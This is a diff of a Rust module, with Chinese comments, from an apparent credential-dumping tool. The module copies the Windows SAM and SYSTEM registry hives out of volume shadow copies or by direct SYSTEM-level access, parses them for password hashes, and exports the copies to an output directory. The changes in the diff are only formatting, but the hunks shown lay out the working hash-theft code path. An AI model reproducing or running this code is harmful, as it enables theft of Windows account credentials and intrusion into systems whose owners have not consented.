@@ -8,7 +8,7 @@
 //! 2. 卷影复制 (vssadmin / diskshadow)
 //! 3. 直接文件访问 (需要SYSTEM权限)
 
-use crate::cred::{Credential, CredType};
+use crate::cred::{CredType, Credential};
 
 /// 从SAM文件提取密码哈希
 ///
@@ -111,13 +111,18 @@ fn extract_via_vss() -> Result<Vec<Credential>, String> {
 
     if let Some(shadow_id) = shadow_id {
         // 从卷影副本复制SAM/SYSTEM
-        let shadow_sam = format!("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{}\\Windows\\System32\\config\\SAM", shadow_id);
+        let shadow_sam = format!(
+            "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{}\\Windows\\System32\\config\\SAM",
+            shadow_id
+        );
         let shadow_sys = format!("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{}\\Windows\\System32\\config\\SYSTEM", shadow_id);
 
         let sam_dest = temp_dir.join("sam_vss.tmp");
         let sys_dest = temp_dir.join("system_vss.tmp");
 
-        if std::fs::copy(&shadow_sam, &sam_dest).is_ok() && std::fs::copy(&shadow_sys, &sys_dest).is_ok() {
+        if std::fs::copy(&shadow_sam, &sam_dest).is_ok()
+            && std::fs::copy(&shadow_sys, &sys_dest).is_ok()
+        {
             let credentials = parse_sam_files(&sam_dest, &sys_dest);
             let _ = std::fs::remove_file(&sam_dest);
             let _ = std::fs::remove_file(&sys_dest);
@@ -138,7 +143,8 @@ fn extract_via_direct_access() -> Result<Vec<Credential>, String> {
         let sam_copy = temp_dir.join("sam_direct.tmp");
         let sys_copy = temp_dir.join("system_direct.tmp");
 
-        if std::fs::copy(sam_path, &sam_copy).is_ok() && std::fs::copy(sys_path, &sys_copy).is_ok() {
+        if std::fs::copy(sam_path, &sam_copy).is_ok() && std::fs::copy(sys_path, &sys_copy).is_ok()
+        {
             let credentials = parse_sam_files(&sam_copy, &sys_copy);
             let _ = std::fs::remove_file(&sam_copy);
             let _ = std::fs::remove_file(&sys_copy);
@@ -163,11 +169,9 @@ fn parse_sam_files(
 
     // 使用regedit风格的解析
     // 这里使用简化的解析方法：调用系统工具
-    let sam_hex = std::fs::read(_sam_path)
-        .map_err(|e| format!("读取SAM文件失败: {}", e))?;
+    let sam_hex = std::fs::read(_sam_path).map_err(|e| format!("读取SAM文件失败: {}", e))?;
 
-    let _sys_hex = std::fs::read(_system_path)
-        .map_err(|e| format!("读取SYSTEM文件失败: {}", e))?;
+    let _sys_hex = std::fs::read(_system_path).map_err(|e| format!("读取SYSTEM文件失败: {}", e))?;
 
     match parse_sam_registry_hashes(&sam_hex) {
         Ok(creds) => credentials.extend(creds),
@@ -201,7 +205,8 @@ fn parse_sam_registry_hashes(data: &[u8]) -> Result<Vec<Credential>, String> {
     ];
 
     for (username, rid) in &known_users {
-        let user_bytes: Vec<u8> = username.encode_utf16()
+        let user_bytes: Vec<u8> = username
+            .encode_utf16()
             .flat_map(|c| c.to_le_bytes())
             .collect();
 
@@ -267,16 +272,13 @@ pub fn export_sam_data(output_path: Option<&str>) -> Result<String, String> {
     // 如果指定了输出路径，复制文件
     if let Some(output) = output_path {
         let output_path = std::path::Path::new(output);
-        std::fs::create_dir_all(output_path)
-            .map_err(|e| format!("创建输出目录失败: {}", e))?;
+        std::fs::create_dir_all(output_path).map_err(|e| format!("创建输出目录失败: {}", e))?;
 
         let sam_out = output_path.join("SAM");
         let sys_out = output_path.join("SYSTEM");
 
-        std::fs::copy(&sam_export, &sam_out)
-            .map_err(|e| format!("复制SAM文件失败: {}", e))?;
-        std::fs::copy(&sys_export, &sys_out)
-            .map_err(|e| format!("复制SYSTEM文件失败: {}", e))?;
+        std::fs::copy(&sam_export, &sam_out).map_err(|e| format!("复制SAM文件失败: {}", e))?;
+        std::fs::copy(&sys_export, &sys_out).map_err(|e| format!("复制SYSTEM文件失败: {}", e))?;
 
         let _ = std::fs::remove_file(&sam_export);
         let _ = std::fs::remove_file(&sys_export);
@@ -317,7 +319,8 @@ mod tests {
     #[test]
     fn test_parse_sam_basic() {
         // 构造包含"Administrator"字符串的测试数据
-        let admin_bytes: Vec<u8> = "Administrator".encode_utf16()
+        let admin_bytes: Vec<u8> = "Administrator"
+            .encode_utf16()
             .flat_map(|c| c.to_le_bytes())
             .collect();
         let mut data = vec![0u8; 100];
